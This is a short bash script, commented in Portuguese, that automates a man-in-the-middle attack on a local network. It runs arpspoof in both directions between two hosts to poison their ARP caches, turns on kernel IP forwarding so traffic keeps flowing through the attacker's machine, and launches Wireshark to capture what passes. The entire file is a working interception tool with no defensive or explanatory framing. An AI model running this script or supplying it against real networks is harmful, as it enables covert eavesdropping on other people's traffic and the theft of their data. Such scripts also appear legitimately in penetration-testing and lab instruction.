#! /bin/bash
# Script para automatizar ataque MITM

clear

# Utiliza a biblioteca 'dsniff' para se posicionar entre os dois alvos
arpspoof -t 192.168.1.105 192.168.1.106 &
arpspoof -t 192.168.1.106 192.168.1.105 &

# Habilita o kernel para encaminhamento de pacotes
echo 1 > /proc/sys/net/ipv4/ip_forward

# Abre o Wireshark para exibir os resultados
/usr/bin/wireshark
